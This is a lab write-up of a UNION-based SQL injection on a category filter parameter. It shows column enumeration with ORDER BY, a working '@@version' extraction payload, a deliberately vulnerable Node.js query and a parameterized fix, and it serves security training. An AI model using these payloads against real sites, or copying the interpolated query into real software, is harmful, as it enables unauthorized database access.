# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

## 1. Vulnerability Discovery & Enumeration (The Analysis)
* **Target Endpoint / Parameter:** `/filter?category=Gifts`
* **Vulnerability Type:** Server-Side (SQL Injection - UNION Based)
* **Target Database Infrastructure:** MySQL / Microsoft SQL Server

### Step 1: Mapping Column Count via Structural Ordering
To ensure compatibility with a `UNION`-based injection layout, I first determined the exact column structure of the primary query using the `ORDER BY` clause. 
* **The MySQL Constraint:** MySQL syntax mandates a trailing space after a double-dash comment (`-- `), which browsers frequently strip. To maintain structural integrity, I utilized the alternative hash symbol (`#`) comment operator.
* `category=Gifts' ORDER BY 1%23` -> HTTP 200 OK
* `category=Gifts' ORDER BY 2%23` -> HTTP 200 OK
* `category=Gifts' ORDER BY 3%23` -> HTTP 500 Internal Server Error

**Deduction:** The database architecture expects exactly **2 columns**. 

### Step 2: Testing Independent Table Constraints
Unlike Oracle, neither MySQL nor Microsoft SQL Server requires a standalone `FROM` statement to return static values. I validated the data types using an unconstrained query:
* Payload: `category=Gifts' UNION SELECT 'abc', 'def'%23` -> HTTP 200 OK

**Deduction:** The query accepts arbitrary string values across both data columns.

## 2. Exploitation (The Hack)
* **Payload Used:** `' UNION SELECT @@version, NULL#`
* **Full URL Encoded Input:** `/filter?category=Gifts'+UNION+SELECT+@@version,+NULL%23`
* **Mechanism:** 
  1. The trailing single quote (`'`) successfully terminates the developer's raw category query encapsulation block.
  2. The `UNION` operator appends an ad-hoc query string directly to the active retrieval buffer array.
  3. Consulting industry threat matrices, both MySQL and Microsoft SQL Server store software configuration details in the global `@@version` configuration parameter.
  4. The payload inputs `@@version` into slot one, and uses a placeholder `NULL` in slot two to satisfy the mandatory 2-column database layout.
  5. The URL-encoded hash character (`%23` / `#`) comments out the remaining developer query code strings, preventing logic and formatting compilation failures.
* **Result:** The web server returned an administrative system readout (e.g., specific Linux/Ubuntu distribution details and core engine versions) printed straight into the public UI context templates.

## 3. Remediation (The Fix)
* **Flawed Concept:** The application takes user-controlled parameter values and dynamically processes them as trusted SQL logic segments.
* **The Correction:** Refactor the structural data queries to utilize **Prepared Statements** with strict parameterized variable binding.

### Vulnerable Code Example (Conceptual Node.js Backend Context)
```javascript
const category = req.query.category;
// Vulnerable: Runtime variable interpolation allows query manipulation
const query = `SELECT name, description FROM products WHERE category = '${category}' AND released = 1`;
db.query(query);
```

### Secure Remediation Example (Parameterized Validation)
```javascript
const category = req.query.category;
// Secure: Explicit separation ensures user input is strictly parsed as data, not code
const query = 'SELECT name, description FROM products WHERE category = \$1 AND released = 1';
db.query(query, [category]);
```
